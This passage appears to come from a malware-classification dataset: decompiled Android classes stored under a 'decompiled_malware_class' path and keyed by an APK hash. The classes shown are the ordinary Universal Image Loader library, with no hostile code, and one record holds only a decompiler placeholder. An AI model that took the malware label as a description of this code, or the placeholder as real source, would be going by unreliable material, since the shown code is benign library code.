this.imageResOnFail=builder.imageResOnFail;     this.imageOnLoading=builder.imageOnLoading;     this.imageForEmptyUri=builder.imageForEmptyUri;     this.imageOnFail=builder.imageOnFail;     this.resetViewBeforeLoading=builder.resetViewBeforeLoading;     this.cacheInMemory=builder.cacheInMemory;     this.cacheOnDisk=builder.cacheOnDisk;     this.imageScaleType=builder.imageScaleType;     this.decodingOptions=builder.decodingOptions;     this.delayBeforeLoading=builder.delayBeforeLoading;     this.considerExifParams=builder.considerExifParams;     this.extraForDownloader=builder.extraForDownloader;     this.preProcessor=builder.preProcessor;     this.postProcessor=builder.postProcessor;     this.displayer=builder.displayer;     this.handler=builder.handler;     this.isSyncLoading=builder.isSyncLoading;   }   public boolean shouldShowImageOnLoading(){     return (this.imageOnLoading == null && this.imageResOnLoading == 0) ? false : true;   }   public boolean shouldShowImageForEmptyUri(){     return (this.imageForEmptyUri == null && this.imageResForEmptyUri == 0) ? false : true;   }   public boolean shouldShowImageOnFail(){     return (this.imageOnFail == null && this.imageResOnFail == 0) ? false : true;   }   public boolean shouldPreProcess(){     return this.preProcessor != null;   }   public boolean shouldPostProcess(){     return this.postProcessor != null;   }   public boolean shouldDelayBeforeLoading(){     return this.delayBeforeLoading > 0;   }   public Drawable getImageOnLoading(  Resources res){     return this.imageResOnLoading != 0 ? res.getDrawable(this.imageResOnLoading) : this.imageOnLoading;   }   public Drawable getImageForEmptyUri(  Resources res){     return this.imageResForEmptyUri != 0 ? res.getDrawable(this.imageResForEmptyUri) : this.imageForEmptyUri;   }   public Drawable getImageOnFail(  Resources res){     return this.imageResOnFail != 0 ? res.getDrawable(this.imageResOnFail) : this.imageOnFail;   }   public boolean isResetViewBeforeLoading(){     return this.resetViewBeforeLoading;   }   public boolean isCacheInMemory(){     return this.cacheInMemory;   }   public boolean isCacheOnDisk(){     return this.cacheOnDisk;   }   public ImageScaleType getImageScaleType(){     return this.imageScaleType;   }   public BitmapFactory.Options getDecodingOptions(){     return this.decodingOptions;   }   public int getDelayBeforeLoading(){     return this.delayBeforeLoading;   }   public boolean isConsiderExifParams(){     return this.considerExifParams;   }   public Object getExtraForDownloader(){     return this.extraForDownloader;   }   public BitmapProcessor getPreProcessor(){     return this.preProcessor;   }   public BitmapProcessor getPostProcessor(){     return this.postProcessor;   }   public BitmapDisplayer getDisplayer(){     return this.displayer;   }   public Handler getHandler(){     return this.handler;   }   public boolean isSyncLoading(){     return this.isSyncLoading;   } public static class Builder {     private int imageResOnLoading=0;     private int imageResForEmptyUri=0;     private int imageResOnFail=0;     private Drawable imageOnLoading=null;     private Drawable imageForEmptyUri=null;     private Drawable imageOnFail=null;     private boolean resetViewBeforeLoading=false;     private boolean cacheInMemory=false;     private boolean cacheOnDisk=false;     private ImageScaleType imageScaleType=ImageScaleType.IN_SAMPLE_POWER_OF_2;     private BitmapFactory.Options decodingOptions=new BitmapFactory.Options();     private int delayBeforeLoading=0;     private boolean considerExifParams=false;     private Object extraForDownloader=null;     private BitmapProcessor preProcessor=null;     private BitmapProcessor postProcessor=null;     private BitmapDisplayer displayer=DefaultConfigurationFactory.createBitmapDisplayer();     private Handler handler=null;     private boolean isSyncLoading=false;     public Builder(){       this.decodingOptions.inPurgeable=true;       this.decodingOptions.inInputShareable=true;     }     @Deprecated public Builder showStubImage(    int imageRes){       this.imageResOnLoading=imageRes;       return this;     }     public Builder showImageOnLoading(    int imageRes){       this.imageResOnLoading=imageRes;       return this;     }     public Builder showImageOnLoading(    Drawable drawable){       this.imageOnLoading=drawable;       return this;     }     public Builder showImageForEmptyUri(    int imageRes){       this.imageResForEmptyUri=imageRes;       return this;     }     public Builder showImageForEmptyUri(    Drawable drawable){       this.imageForEmptyUri=drawable;       return this;     }     public Builder showImageOnFail(    int imageRes){       this.imageResOnFail=imageRes;       return this;     }     public Builder showImageOnFail(    Drawable drawable){       this.imageOnFail=drawable;       return this;     }     public Builder resetViewBeforeLoading(){       this.resetViewBeforeLoading=true;       return this;     }     public Builder resetViewBeforeLoading(    boolean resetViewBeforeLoading){       this.resetViewBeforeLoading=resetViewBeforeLoading;       return this;     }     @Deprecated public Builder cacheInMemory(){       this.cacheInMemory=true;       return this;     }     public Builder cacheInMemory(    boolean cacheInMemory){       this.cacheInMemory=cacheInMemory;       return this;     }     @Deprecated public Builder cacheOnDisc(){       return cacheOnDisk(true);     }     @Deprecated public Builder cacheOnDisc(    boolean cacheOnDisk){       return cacheOnDisk(cacheOnDisk);     }     public Builder cacheOnDisk(    boolean cacheOnDisk){       this.cacheOnDisk=cacheOnDisk;       return this;     }     public Builder imageScaleType(    ImageScaleType imageScaleType){       this.imageScaleType=imageScaleType;       return this;     }     public Builder bitmapConfig(    Bitmap.Config bitmapConfig){       if (bitmapConfig == null) {         throw new IllegalArgumentException(""bitmapConfig can't be null"");       }       this.decodingOptions.inPreferredConfig=bitmapConfig;       return this;     }     public Builder decodingOptions(    BitmapFactory.Options decodingOptions){       if (decodingOptions == null) {         throw new IllegalArgumentException(""decodingOptions can't be null"");       }       this.decodingOptions=decodingOptions;       return this;     }     public Builder delayBeforeLoading(    int delayInMillis){       this.delayBeforeLoading=delayInMillis;       return this;     }     public Builder extraForDownloader(    Object extra){       this.extraForDownloader=extra;       return this;     }     public Builder considerExifParams(    boolean considerExifParams){       this.considerExifParams=considerExifParams;       return this;     }     public Builder preProcessor(    BitmapProcessor preProcessor){       this.preProcessor=preProcessor;       return this;     }     public Builder postProcessor(    BitmapProcessor postProcessor){       this.postProcessor=postProcessor;       return this;     }     public Builder displayer(    BitmapDisplayer displayer){       if (displayer == null) {         throw new IllegalArgumentException(""displayer can't be null"");       }       this.displayer=displayer;       return this;     }     public Builder syncLoading(    boolean isSyncLoading){       this.isSyncLoading=isSyncLoading;       return this;     }     public Builder handler(    Handler handler){       this.handler=handler;       return this;     }     public Builder cloneFrom(    DisplayImageOptions options){       this.imageResOnLoading=options.imageResOnLoading;       this.imageResForEmptyUri=options.imageResForEmptyUri;       this.imageResOnFail=options.imageResOnFail;       this.imageOnLoading=options.imageOnLoading;       this.imageForEmptyUri=options.imageForEmptyUri;       this.imageOnFail=options.imageOnFail;       this.resetViewBeforeLoading=options.resetViewBeforeLoading;       this.cacheInMemory=options.cacheInMemory;       this.cacheOnDisk=options.cacheOnDisk;       this.imageScaleType=options.imageScaleType;       this.decodingOptions=options.decodingOptions;       this.delayBeforeLoading=options.delayBeforeLoading;       this.considerExifParams=options.considerExifParams;       this.extraForDownloader=options.extraForDownloader;       this.preProcessor=options.preProcessor;       this.postProcessor=options.postProcessor;       this.displayer=options.displayer;       this.handler=options.handler;       this.isSyncLoading=options.isSyncLoading;       return this;     }     public DisplayImageOptions build(){       return new DisplayImageOptions(this);     }   }   public static DisplayImageOptions createSimple(){     return new Builder().build();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\ImageLoader.code","public class ImageLoader {   private static final String ERROR_INIT_CONFIG_WITH_NULL=""ImageLoader configuration can not be initialized with null"";   private static final String ERROR_NOT_INIT=""ImageLoader must be init with configuration before using"";   private static final String ERROR_WRONG_ARGUMENTS=""Wrong arguments were passed to displayImage() method (ImageView reference must not be null)"";   static final String LOG_DESTROY=""Destroy ImageLoader"";   static final String LOG_INIT_CONFIG=""Initialize ImageLoader with configuration"";   static final String LOG_LOAD_IMAGE_FROM_MEMORY_CACHE=""Load image from memory cache [%s]"";   public static final String TAG=ImageLoader.class.getSimpleName();   private static final String WARNING_RE_INIT_CONFIG=""Try to initialize ImageLoader which had already been initialized before. To re-init ImageLoader with new configuration call ImageLoader.destroy() at first."";   private static volatile ImageLoader instance;   private ImageLoaderConfiguration configuration;   private final ImageLoadingListener emptyListener=new SimpleImageLoadingListener();   private ImageLoaderEngine engine;   public static ImageLoader getInstance(){     if (instance == null) { synchronized (ImageLoader.class) {         if (instance == null) {           instance=new ImageLoader();         }       }     }     return instance;   }   protected ImageLoader(){   }   public synchronized void init(  ImageLoaderConfiguration configuration){     if (configuration == null) {       throw new IllegalArgumentException(ERROR_INIT_CONFIG_WITH_NULL);     }     if (this.configuration == null) {       L.d(LOG_INIT_CONFIG,new Object[0]);       this.engine=new ImageLoaderEngine(configuration);       this.configuration=configuration;     }  else {       L.w(WARNING_RE_INIT_CONFIG,new Object[0]);     }   }   public boolean isInited(){     return this.configuration != null;   }   public void displayImage(  String uri,  ImageAware imageAware){     displayImage(uri,imageAware,(DisplayImageOptions)null,(ImageLoadingListener)null,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageAware imageAware,  ImageLoadingListener listener){     displayImage(uri,imageAware,(DisplayImageOptions)null,listener,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageAware imageAware,  DisplayImageOptions options){     displayImage(uri,imageAware,options,(ImageLoadingListener)null,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageAware imageAware,  DisplayImageOptions options,  ImageLoadingListener listener){     displayImage(uri,imageAware,options,listener,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageAware imageAware,  DisplayImageOptions options,  ImageLoadingListener listener,  ImageLoadingProgressListener progressListener){     checkConfiguration();     if (imageAware == null) {       throw new IllegalArgumentException(ERROR_WRONG_ARGUMENTS);     }     if (listener == null) {       listener=this.emptyListener;     }     if (options == null) {       options=this.configuration.defaultDisplayImageOptions;     }     if (TextUtils.isEmpty(uri)) {       this.engine.cancelDisplayTaskFor(imageAware);       listener.onLoadingStarted(uri,imageAware.getWrappedView());       if (options.shouldShowImageForEmptyUri()) {         imageAware.setImageDrawable(options.getImageForEmptyUri(this.configuration.resources));       }  else {         imageAware.setImageDrawable(null);       }       listener.onLoadingComplete(uri,imageAware.getWrappedView(),null);       return;     }     ImageSize targetSize=ImageSizeUtils.defineTargetSizeForView(imageAware,this.configuration.getMaxImageSize());     String memoryCacheKey=MemoryCacheUtils.generateKey(uri,targetSize);     this.engine.prepareDisplayTaskFor(imageAware,memoryCacheKey);     listener.onLoadingStarted(uri,imageAware.getWrappedView());     Bitmap bmp=this.configuration.memoryCache.get(memoryCacheKey);     if (bmp != null && !bmp.isRecycled()) {       L.d(LOG_LOAD_IMAGE_FROM_MEMORY_CACHE,memoryCacheKey);       if (options.shouldPostProcess()) {         ImageLoadingInfo imageLoadingInfo=new ImageLoadingInfo(uri,imageAware,targetSize,memoryCacheKey,options,listener,progressListener,this.engine.getLockForUri(uri));         ProcessAndDisplayImageTask displayTask=new ProcessAndDisplayImageTask(this.engine,bmp,imageLoadingInfo,defineHandler(options));         if (options.isSyncLoading()) {           displayTask.run();           return;         }  else {           this.engine.submit(displayTask);           return;         }       }       options.getDisplayer().display(bmp,imageAware,LoadedFrom.MEMORY_CACHE);       listener.onLoadingComplete(uri,imageAware.getWrappedView(),bmp);       return;     }     if (options.shouldShowImageOnLoading()) {       imageAware.setImageDrawable(options.getImageOnLoading(this.configuration.resources));     }  else     if (options.isResetViewBeforeLoading()) {       imageAware.setImageDrawable(null);     }     ImageLoadingInfo imageLoadingInfo2=new ImageLoadingInfo(uri,imageAware,targetSize,memoryCacheKey,options,listener,progressListener,this.engine.getLockForUri(uri));     LoadAndDisplayImageTask displayTask2=new LoadAndDisplayImageTask(this.engine,imageLoadingInfo2,defineHandler(options));     if (options.isSyncLoading()) {       displayTask2.run();     }  else {       this.engine.submit(displayTask2);     }   }   public void displayImage(  String uri,  ImageView imageView){     displayImage(uri,new ImageViewAware(imageView),(DisplayImageOptions)null,(ImageLoadingListener)null,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageView imageView,  DisplayImageOptions options){     displayImage(uri,new ImageViewAware(imageView),options,(ImageLoadingListener)null,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageView imageView,  ImageLoadingListener listener){     displayImage(uri,new ImageViewAware(imageView),(DisplayImageOptions)null,listener,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageView imageView,  DisplayImageOptions options,  ImageLoadingListener listener){     displayImage(uri,imageView,options,listener,(ImageLoadingProgressListener)null);   }   public void displayImage(  String uri,  ImageView imageView,  DisplayImageOptions options,  ImageLoadingListener listener,  ImageLoadingProgressListener progressListener){     displayImage(uri,new ImageViewAware(imageView),options,listener,progressListener);   }   public void loadImage(  String uri,  ImageLoadingListener listener){     loadImage(uri,null,null,listener,null);   }   public void loadImage(  String uri,  ImageSize targetImageSize,  ImageLoadingListener listener){     loadImage(uri,targetImageSize,null,listener,null);   }   public void loadImage(  String uri,  DisplayImageOptions options,  ImageLoadingListener listener){     loadImage(uri,null,options,listener,null);   }   public void loadImage(  String uri,  ImageSize targetImageSize,  DisplayImageOptions options,  ImageLoadingListener listener){     loadImage(uri,targetImageSize,options,listener,null);   }   public void loadImage(  String uri,  ImageSize targetImageSize,  DisplayImageOptions options,  ImageLoadingListener listener,  ImageLoadingProgressListener progressListener){     checkConfiguration();     if (targetImageSize == null) {       targetImageSize=this.configuration.getMaxImageSize();     }     if (options == null) {       options=this.configuration.defaultDisplayImageOptions;     }     NonViewAware imageAware=new NonViewAware(uri,targetImageSize,ViewScaleType.CROP);     displayImage(uri,imageAware,options,listener,progressListener);   }   public Bitmap loadImageSync(  String uri){     return loadImageSync(uri,null,null);   }   public Bitmap loadImageSync(  String uri,  DisplayImageOptions options){     return loadImageSync(uri,null,options);   }   public Bitmap loadImageSync(  String uri,  ImageSize targetImageSize){     return loadImageSync(uri,targetImageSize,null);   }   public Bitmap loadImageSync(  String uri,  ImageSize targetImageSize,  DisplayImageOptions options){     if (options == null) {       options=this.configuration.defaultDisplayImageOptions;     }     DisplayImageOptions options2=new DisplayImageOptions.Builder().cloneFrom(options).syncLoading(true).build();     SyncImageLoadingListener listener=new SyncImageLoadingListener();     loadImage(uri,targetImageSize,options2,listener);     return listener.getLoadedBitmap();   }   private void checkConfiguration(){     if (this.configuration == null) {       throw new IllegalStateException(ERROR_NOT_INIT);     }   }   public MemoryCache getMemoryCache(){     checkConfiguration();     return this.configuration.memoryCache;   }   public void clearMemoryCache(){     checkConfiguration();     this.configuration.memoryCache.clear();   }   @Deprecated public DiskCache getDiscCache(){     return getDiskCache();   }   public DiskCache getDiskCache(){     checkConfiguration();     return this.configuration.diskCache;   }   @Deprecated public void clearDiscCache(){     clearDiskCache();   }   public void clearDiskCache(){     checkConfiguration();     this.configuration.diskCache.clear();   }   public String getLoadingUriForView(  ImageAware imageAware){     return this.engine.getLoadingUriForView(imageAware);   }   public String getLoadingUriForView(  ImageView imageView){     return this.engine.getLoadingUriForView(new ImageViewAware(imageView));   }   public void cancelDisplayTask(  ImageAware imageAware){     this.engine.cancelDisplayTaskFor(imageAware);   }   public void cancelDisplayTask(  ImageView imageView){     this.engine.cancelDisplayTaskFor(new ImageViewAware(imageView));   }   public void denyNetworkDownloads(  boolean denyNetworkDownloads){     this.engine.denyNetworkDownloads(denyNetworkDownloads);   }   public void handleSlowNetwork(  boolean handleSlowNetwork){     this.engine.handleSlowNetwork(handleSlowNetwork);   }   public void pause(){     this.engine.pause();   }   public void resume(){     this.engine.resume();   }   public void stop(){     this.engine.stop();   }   public void destroy(){     if (this.configuration != null) {       L.d(LOG_DESTROY,new Object[0]);     }     stop();     this.configuration.diskCache.close();     this.engine=null;     this.configuration=null;   }   private static Handler defineHandler(  DisplayImageOptions options){     Handler handler=options.getHandler();     if (options.isSyncLoading()) {       return null;     }     if (handler == null && Looper.myLooper() == Looper.getMainLooper()) {       return new Handler();     }     return handler;   } public static class SyncImageLoadingListener extends SimpleImageLoadingListener {     private Bitmap loadedImage;     private SyncImageLoadingListener(){     }     @Override public void onLoadingComplete(    String imageUri,    View view,    Bitmap loadedImage){       this.loadedImage=loadedImage;     }     public Bitmap getLoadedBitmap(){       return this.loadedImage;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\ImageLoaderConfiguration.code","!org.eclipse.jdt.core.dom.TypeDeclaration@3d7f3be9"
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\ImageLoaderEngine.code","public class ImageLoaderEngine {   final ImageLoaderConfiguration configuration;   private Executor taskExecutor;   private Executor taskExecutorForCachedImages;   private final Map<Integer,String> cacheKeysForImageAwares=Collections.synchronizedMap(new HashMap());   private final Map<String,ReentrantLock> uriLocks=new WeakHashMap();   private final AtomicBoolean paused=new AtomicBoolean(false);   private final AtomicBoolean networkDenied=new AtomicBoolean(false);   private final AtomicBoolean slowNetwork=new AtomicBoolean(false);   private final Object pauseLock=new Object();   private Executor taskDistributor=DefaultConfigurationFactory.createTaskDistributor();   public ImageLoaderEngine(  ImageLoaderConfiguration configuration){     this.configuration=configuration;     this.taskExecutor=configuration.taskExecutor;     this.taskExecutorForCachedImages=configuration.taskExecutorForCachedImages;   }   public void submit(  final LoadAndDisplayImageTask task){     this.taskDistributor.execute(new Runnable(){       @Override public void run(){         File image=ImageLoaderEngine.this.configuration.diskCache.get(task.getLoadingUri());         boolean isImageCachedOnDisk=image != null && image.exists();         ImageLoaderEngine.this.initExecutorsIfNeed();         if (isImageCachedOnDisk) {           ImageLoaderEngine.this.taskExecutorForCachedImages.execute(task);         }  else {           ImageLoaderEngine.this.taskExecutor.execute(task);         }       }     } );   }   public void submit(  ProcessAndDisplayImageTask task){     initExecutorsIfNeed();     this.taskExecutorForCachedImages.execute(task);   }   public void initExecutorsIfNeed(){     if (!this.configuration.customExecutor && ((ExecutorService)this.taskExecutor).isShutdown()) {       this.taskExecutor=createTaskExecutor();     }     if (!this.configuration.customExecutorForCachedImages && ((ExecutorService)this.taskExecutorForCachedImages).isShutdown()) {       this.taskExecutorForCachedImages=createTaskExecutor();     }   }   private Executor createTaskExecutor(){     return DefaultConfigurationFactory.createExecutor(this.configuration.threadPoolSize,this.configuration.threadPriority,this.configuration.tasksProcessingType);   }   public String getLoadingUriForView(  ImageAware imageAware){     return this.cacheKeysForImageAwares.get(Integer.valueOf(imageAware.getId()));   }   public void prepareDisplayTaskFor(  ImageAware imageAware,  String memoryCacheKey){     this.cacheKeysForImageAwares.put(Integer.valueOf(imageAware.getId()),memoryCacheKey);   }   public void cancelDisplayTaskFor(  ImageAware imageAware){     this.cacheKeysForImageAwares.remove(Integer.valueOf(imageAware.getId()));   }   public void denyNetworkDownloads(  boolean denyNetworkDownloads){     this.networkDenied.set(denyNetworkDownloads);   }   public void handleSlowNetwork(  boolean handleSlowNetwork){     this.slowNetwork.set(handleSlowNetwork);   }   public void pause(){     this.paused.set(true);   }   public void resume(){     this.paused.set(false); synchronized (this.pauseLock) {       this.pauseLock.notifyAll();     }   }   public void stop(){     if (!this.configuration.customExecutor) {       ((ExecutorService)this.taskExecutor).shutdownNow();     }     if (!this.configuration.customExecutorForCachedImages) {       ((ExecutorService)this.taskExecutorForCachedImages).shutdownNow();     }     this.cacheKeysForImageAwares.clear();     this.uriLocks.clear();   }   public void fireCallback(  Runnable r){     this.taskDistributor.execute(r);   }   public ReentrantLock getLockForUri(  String uri){     ReentrantLock lock=this.uriLocks.get(uri);     if (lock == null) {       ReentrantLock lock2=new ReentrantLock();       this.uriLocks.put(uri,lock2);       return lock2;     }     return lock;   }   public AtomicBoolean getPause(){     return this.paused;   }   public Object getPauseLock(){     return this.pauseLock;   }   public boolean isNetworkDenied(){     return this.networkDenied.get();   }   public boolean isSlowNetwork(){     return this.slowNetwork.get();   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\ImageLoadingInfo.code","public final class ImageLoadingInfo {   final ImageAware imageAware;   final ImageLoadingListener listener;   final ReentrantLock loadFromUriLock;   final String memoryCacheKey;   final DisplayImageOptions options;   final ImageLoadingProgressListener progressListener;   final ImageSize targetSize;   final String uri;   public ImageLoadingInfo(  String uri,  ImageAware imageAware,  ImageSize targetSize,  String memoryCacheKey,  DisplayImageOptions options,  ImageLoadingListener listener,  ImageLoadingProgressListener progressListener,  ReentrantLock loadFromUriLock){     this.uri=uri;     this.imageAware=imageAware;     this.targetSize=targetSize;     this.options=options;     this.listener=listener;     this.progressListener=progressListener;     this.loadFromUriLock=loadFromUriLock;     this.memoryCacheKey=memoryCacheKey;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.nostra13.universalimageloader.core\LoadAndDisplayImageTask.code","public final class LoadAndDisplayImageTask implements Runnable, IoUtils.CopyListener {   private static final String ERROR_POST_PROCESSOR_NULL=""Post-processor returned null [%s]"";   private static final String ERROR_PRE_PROCESSOR_NULL=""Pre-processor returned null [%s]"";   private static final String ERROR_PROCESSOR_FOR_DISK_CACHE_NULL=""Bitmap processor for disk cache returned null [%s]"";   private static final String LOG_CACHE_IMAGE_IN_MEMORY=""Cache image in memory [%s]"";   private static final String LOG_CACHE_IMAGE_ON_DISK=""Cache image on disk [%s]"";   private static final String LOG_DELAY_BEFORE_LOADING=""Delay %d ms before loading...  [%s]"";   private static final String LOG_GET_IMAGE_FROM_MEMORY_CACHE_AFTER_WAITING=""...Get cached bitmap from memory after waiting. [%s]"";   private static final String LOG_LOAD_IMAGE_FROM_DISK_CACHE=""Load image from disk cache [%s]"";   private static final String LOG_LOAD_IMAGE_FROM_NETWORK=""Load image from network [%s]"";   private static final String LOG_POSTPROCESS_IMAGE=""PostProcess image before displaying [%s]"";   private static final String LOG_PREPROCESS_IMAGE=""PreProcess image before caching in memory [%s]"";   private static final String LOG_PROCESS_IMAGE_BEFORE_CACHE_ON_DISK=""Process image before cache on disk [%s]"";   private static final String LOG_RESIZE_CACHED_IMAGE_FILE=""Resize image in disk cache [%s]"";   private static final String LOG_RESUME_AFTER_PAUSE="".. Resume loading [%s]"";   private static final String LOG_START_DISPLAY_IMAGE_TASK=""Start display image task [%s]"";   private static final String LOG_TASK_CANCELLED_IMAGEAWARE_COLLECTED=""ImageAware was collected by GC. Task is cancelled. [%s]"";   private static final String LOG_TASK_CANCELLED_IMAGEAWARE_REUSED=""ImageAware is reused for another image. Task is cancelled. [%s]"";   private static final String LOG_TASK_INTERRUPTED=""Task was interrupted [%s]"";   private static final String LOG_WAITING_FOR_IMAGE_LOADED=""Image already is loading. Waiting... [%s]"";   private static final String LOG_WAITING_FOR_RESUME=""ImageLoader is paused. Waiting...  [%s]"";   private final ImageLoaderConfiguration configuration;   private final ImageDecoder decoder;   private final ImageDownloader downloader;   private final ImageLoaderEngine engine;   private final Handler handler;   final ImageAware imageAware;   private final ImageLoadingInfo imageLoadingInfo;   final ImageLoadingListener listener;   private LoadedFrom loadedFrom=LoadedFrom.NETWORK;   private final String memoryCacheKey;   private final ImageDownloader networkDeniedDownloader;   final DisplayImageOptions options;   final ImageLoadingProgressListener progressListener;   private final ImageDownloader slowNetworkDownloader;   private final boolean syncLoading;   private final ImageSize targetSize;   final String uri;   public LoadAndDisplayImageTask(  ImageLoaderEngine engine,  ImageLoadingInfo imageLoadingInfo,  Handler handler){     this.engine=engine;     this.imageLoadingInfo=imageLoadingInfo;     this.handler=handler;     this.configuration=engine.configuration;     this.downloader=this.configuration.downloader;     this.networkDeniedDownloader=this.configuration.networkDeniedDownloader;     this.slowNetworkDownloader=this.configuration.slowNetworkDownloader;     this.decoder=this.configuration.decoder;     this.uri=imageLoadingInfo.uri;     this.memoryCacheKey=imageLoadingInfo.memoryCacheKey;     this.imageAware=imageLoadingInfo.imageAware;     this.targetSize=imageLoadingInfo.targetSize;     this.options=imageLoadingInfo.options;     this.listener=imageLoadingInfo.listener;     this.progressListener=imageLoadingInfo.progressListener;     this.syncLoading=this.options.isSyncLoading();   }   @Override public void run(){     if (!waitIfPaused() && !delayIfNeed()) {       ReentrantLock loadFromUriLock=this.imageLoadingInfo.loadFromUriLock;       L.d(LOG_START_DISPLAY_IMAGE_TASK,this.memoryCacheKey);       if (loadFromUriLock.isLocked()) {         L.d(LOG_WAITING_FOR_IMAGE_LOADED,this.memoryCacheKey);       }       loadFromUriLock.lock();       try {         checkTaskNotActual();         Bitmap bmp=this.configuration.memoryCache.get(this.memoryCacheKey);         if (bmp == null || bmp.isRecycled()) {           bmp=tryLoadBitmap();           if (bmp != null) {             checkTaskNotActual();             checkTaskInterrupted();             if (this.options.shouldPreProcess()) {               L.d(LOG_PREPROCESS_IMAGE,this.memoryCacheKey);               bmp=this.options.getPreProcessor().process(bmp);               if (bmp == null) {                 L.e(ERROR_PRE_PROCESSOR_NULL,this.memoryCacheKey);               }             }             if (bmp != null && this.options.isCacheInMemory()) {               L.d(LOG_CACHE_IMAGE_IN_MEMORY,this.memoryCacheKey);               this.configuration.memoryCache.put(this.memoryCacheKey,bmp);             }           }  else {             return;           }         }  else {           this.loadedFrom=LoadedFrom.MEMORY_CACHE;           L.d(LOG_GET_IMAGE_FROM_MEMORY_CACHE_AFTER_WAITING,this.memoryCacheKey);         }         if (bmp != null && this.options.shouldPostProcess()) {           L.d(LOG_POSTPROCESS_IMAGE,this.memoryCacheKey);           bmp=this.options.getPostProcessor().process(bmp);           if (bmp == null) {             L.e(ERROR_POST_PROCESSOR_NULL,this.memoryCacheKey);           }         }         checkTaskNotActual();         checkTaskInterrupted();         loadFromUriLock.unlock();         DisplayBitmapTask displayBitmapTask=new DisplayBitmapTask(bmp,this.imageLoadingInfo,this.engine,this.loadedFrom);         runTask(displayBitmapTask,this.syncLoading,this.handler,this.engine);       }  catch (      TaskCancelledException e) {         fireCancelEvent();       }  finally {         loadFromUriLock.unlock();       }     }   }   private boolean waitIfPaused(){     AtomicBoolean pause=this.engine.getPause();     if (pause.get()) { synchronized (this.engine.getPauseLock()) {         if (pause.get()) {           L.d(LOG_WAITING_FOR_RESUME,this.memoryCacheKey);           try {             this.engine.getPauseLock().wait();             L.d(LOG_RESUME_AFTER_PAUSE,this.memoryCacheKey);           }  catch (          InterruptedException e) {             L.e(LOG_TASK_INTERRUPTED,this.memoryCacheKey);             return true;           }         }       }     }     return isTaskNotActual();   }   private boolean delayIfNeed(){     if (!this.options.shouldDelayBeforeLoading()) {       return false;     }     L.d(LOG_DELAY_BEFORE_LOADING,Integer.valueOf(this.options.getDelayBeforeLoading()),this.memoryCacheKey);     try {       Thread.sleep(this.options.getDelayBeforeLoading());       return isTaskNotActual();     }  catch (    InterruptedException e) {       L.e(LOG_TASK_INTERRUPTED,this.memoryCacheKey);       return true;     }   }   private Bitmap tryLoadBitmap() throws TaskCancelledException {     File imageFile;     Bitmap bitmap=null;     try {       File imageFile2=this.configuration.diskCache.get(this.uri);       if (imageFile2 != null && imageFile2.exists()) {         L.d(LOG_LOAD_IMAGE_FROM_DISK_CACHE,this.memoryCacheKey);         this.loadedFrom=LoadedFrom.DISC_CACHE;         checkTaskNotActual();         bitmap=decodeImage(ImageDownloader.Scheme.FILE.wrap(imageFile2.getAbsolutePath()));       }       if (bitmap == null || bitmap.getWidth() <= 0 || bitmap.getHeight() <= 0) {         L.d(LOG_LOAD_IMAGE_FROM_NETWORK,this.memoryCacheKey);         this.loadedFrom=LoadedFrom.NETWORK;         String imageUriForDecoding=this.uri;         if (this.options.isCacheOnDisk() && tryCacheImageOnDisk() && (imageFile=this.configuration.diskCache.get(this.uri)) != null) {           imageUriForDecoding=ImageDownloader.Scheme.FILE.wrap(imageFile.getAbsolutePath());         }         checkTaskNotActual();         bitmap=decodeImage(imageUriForDecoding);         if (bitmap == null || bitmap.getWidth() <= 0 || bitmap.getHeight() <= 0) {           fireFailEvent(FailReason.FailType.DECODING_ERROR,null);         }       }     }  catch (    TaskCancelledException e) {       throw e;     } catch (    IOException e2) {       L.e(e2);       fireFailEvent(FailReason.FailType.IO_ERROR,e2);     } catch (    IllegalStateException e3) {       fireFailEvent(FailReason.FailType.NETWORK_DENIED,null);     } catch (    OutOfMemoryError e4) {       L.e(e4);       fireFailEvent(FailReason.FailType.OUT_OF_MEMORY,e4);     } catch (    Throwable e5) {       L.e(e5);       fireFailEvent(FailReason.FailType.UNKNOWN,e5);     }     return bitmap;   }   private Bitmap decodeImage(  String imageUri) throws IOException {     ViewScaleType viewScaleType=this.imageAware.getScaleType();     ImageDecodingInfo decodingInfo=new ImageDecodingInfo(this.memoryCacheKey,imageUri,this.uri,this.targetSize,viewScaleType,getDownloader(),this.options);     return this.decoder.decode(decodingInfo);   }   private boolean tryCacheImageOnDisk() throws TaskCancelledException {     L.d(LOG_CACHE_IMAGE_ON_DISK,this.memoryCacheKey);     try {       boolean loaded=downloadImage();       if (loaded) {         int width=this.configuration.maxImageWidthForDiskCache;         int height=this.configuration.maxImageHeightForDiskCache;         if (width > 0 || height > 0) {           L.d(LOG_RESIZE_CACHED_IMAGE_FILE,this.memoryCacheKey);           resizeAndSaveImage(width,height);           return loaded;         }         return loaded;       }       return loaded;     }  catch (    IOException e) {       L.e(e);       return false;     }   }   private boolean downloadImage() throws IOException {     InputStream is=getDownloader().getStream(this.uri,this.options.getExtraForDownloader());     return this.configuration.diskCache.save(this.uri,is,this);   }   private boolean resizeAndSaveImage(  int maxWidth,  int maxHeight) throws IOException {     File targetFile=this.configuration.diskCache.get(this.uri);     if (targetFile == null || !targetFile.exists()) {       return false;     }     ImageSize targetImageSize=new ImageSize(maxWidth,maxHeight);     DisplayImageOptions specialOptions=new DisplayImageOptions.Builder().cloneFrom(this.options).imageScaleType(ImageScaleType.IN_SAMPLE_INT).build();     ImageDecodingInfo decodingInfo=new 